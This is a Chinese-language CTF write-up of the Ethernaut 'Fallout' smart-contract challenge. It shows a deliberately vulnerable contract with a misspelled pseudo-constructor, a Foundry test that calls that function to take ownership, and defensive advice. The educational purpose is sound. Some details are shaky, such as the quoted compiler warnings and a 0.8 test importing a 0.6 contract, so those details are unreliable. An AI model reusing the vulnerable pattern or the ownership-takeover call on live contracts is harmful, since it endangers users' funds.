---
title: 'Ethernaut Level 2: Fallout - 构造函数命名漏洞'
date: 2025-01-25 14:20:00
updated: 2025-01-25 14:20:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - 构造函数
  - 命名漏洞
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "学习如何利用 Solidity 早期版本构造函数命名错误导致的权限漏洞，了解代码审计中的细节重要性。"
---

# 🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞

> **关卡链接**: [Ethernaut Level 2 - Fallout](https://ethernaut.openzeppelin.com/level/2)  
> **攻击类型**: 构造函数命名错误、历史漏洞  
> **难度**: ⭐☆☆☆☆

## 📋 挑战目标

这个关卡考查的是开发者在代码编写中的细心程度：

1. **获取合约控制权** - 成为合约的 `owner`
2. **理解历史漏洞** - 学习 Solidity 早期版本的安全问题

## 🔍 漏洞分析

### 合约源码分析

```solidity
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    
    using SafeMath for uint256;
    mapping (address => uint) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {  // 🚨 注意这里的拼写！
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
    }
}
```

### 漏洞识别

仔细观察合约代码，我们发现一个**极其微妙但致命的错误**：

```solidity
// 合约名称
contract Fallout {

    /* constructor */
    function Fal1out() public payable {  // ❌ 这里是 "Fal1out" (数字1)
        owner = msg.sender;             // 而不是 "Fallout" (字母l)
        allocations[owner] = msg.value;
    }
}
```

### 历史背景

在 **Solidity 0.4.22** 之前，构造函数的定义方式是：
- 创建一个与合约名称**完全相同**的函数
- 该函数会在合约部署时自动执行一次

但在这个合约中：
- 合约名称是 `Fallout`（字母 l）
- 函数名称是 `Fal1out`（数字 1）

**结果**: 这个函数不是构造函数，而是一个**普通的公开函数**！

### 攻击路径

1. **识别伪装的构造函数** - 发现 `Fal1out()` 函数可以被任何人调用
2. **直接调用函数** - 调用 `Fal1out()` 成为 `owner`
3. **验证权限获取** - 确认已获得合约控制权

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout public instance;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // 部署目标合约
        instance = new Fallout();
        
        // 给攻击者一些初始资金
        vm.deal(attacker, 1 ether);
    }

    function testFalloutExploit() public {
        vm.startPrank(attacker);
        
        console.log("Original owner:", instance.owner());
        console.log("Attacker address:", attacker);
        
        // 攻击步骤：直接调用错误命名的"构造函数"
        instance.Fal1out{value: 0.001 ether}();
        
        // 验证攻击成功
        assertEq(instance.owner(), attacker);
        console.log("New owner:", instance.owner());
        
        vm.stopPrank();
    }
    
    function testOriginalOwnerIsZero() public view {
        // 验证合约部署后没有owner（因为构造函数未执行）
        assertEq(instance.owner(), address(0));
    }
}
```

### 运行测试

```bash
# 运行 Fallout 关卡测试
forge test --match-contract FalloutTest -vvv

# 预期输出：
# [PASS] testFalloutExploit()
# [PASS] testOriginalOwnerIsZero()
```

## 🛡️ 防御措施

### 现代 Solidity 解决方案

从 **Solidity 0.4.22** 开始，引入了 `constructor` 关键字：

```solidity
pragma solidity ^0.8.0;

contract SecureFallout {
    address public owner;
    mapping (address => uint) allocations;
    
    // ✅ 使用 constructor 关键字
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }
    
    // 其他函数...
}
```

### 安全最佳实践

1. **使用现代语法**
```solidity
// ❌ 旧版本（容易出错）
function ContractName() public {
    // 构造逻辑
}

// ✅ 新版本（明确且安全）
constructor() {
    // 构造逻辑
}
```

2. **代码审计检查清单**
```solidity
// 检查项目：
// ✅ 构造函数名称与合约名称是否完全匹配
// ✅ 是否使用了现代 constructor 语法
// ✅ 是否有多个类似构造函数的函数
// ✅ 权限初始化是否正确执行
```

3. **编译器警告**
```bash
# 现代编译器会对可疑的函数名发出警告
Warning: Function state mutability can be restricted to pure
Warning: This function has the same name as the contract
```

## 📚 核心知识点

### 1. Solidity 版本演进

| 版本 | 构造函数语法 | 安全性 |
|------|------------|--------|
| < 0.4.22 | `function ContractName()` | ❌ 容易拼写错误 |
| >= 0.4.22 | `constructor()` | ✅ 明确且安全 |

### 2. 常见命名错误

```solidity
contract MyContract {
    // ❌ 常见错误类型
    function MyContracr() public { }  // 拼写错误
    function myContract() public { }  // 大小写错误
    function MyContract_() public { } // 多余字符
    function MyContract() public { }  // 可能正确，但不推荐
}
```

### 3. 代码审计重点

- **字符相似性检查** - 1 vs l, 0 vs O
- **大小写敏感性** - Solidity 区分大小写
- **额外字符检查** - 下划线、空格等
- **编码问题** - Unicode 字符混用

## 🔍 实际案例分析

### 历史上的类似漏洞

1. **Rubixi 智能合约** (2016)
   - 合约从 `DynamicPyramid` 重命名为 `Rubixi`
   - 忘记更新构造函数名称
   - 导致任何人都可以成为 owner

2. **其他类似案例**
   - 复制粘贴代码时忘记修改函数名
   - 团队协作中的沟通失误
   - 自动化重构工具的缺陷

### 漏洞影响评估

- **直接影响**: 完全丧失合约控制权
- **资金风险**: 合约中的所有资金
- **修复难度**: 无法修复，需要重新部署
- **检测难度**: 极低，但容易被忽视

## 🎯 总结

Fallout 关卡展示了一个看似微不足道但后果严重的漏洞：

- ✅ **细节决定成败** - 一个字符的差异导致完全不同的结果
- ✅ **工具的重要性** - 现代编译器和工具可以避免此类错误
- ✅ **代码审计的价值** - 人工审计能发现工具遗漏的问题
- ✅ **版本升级的必要性** - 使用最新的安全特性

这个案例提醒我们，在智能合约开发中，**没有小错误，只有大损失**。

---

## 🔗 相关链接

- **[上一关: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**
- **[下一关: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**

---

*魔鬼藏在细节中，安全始于每一个字符。* 🔍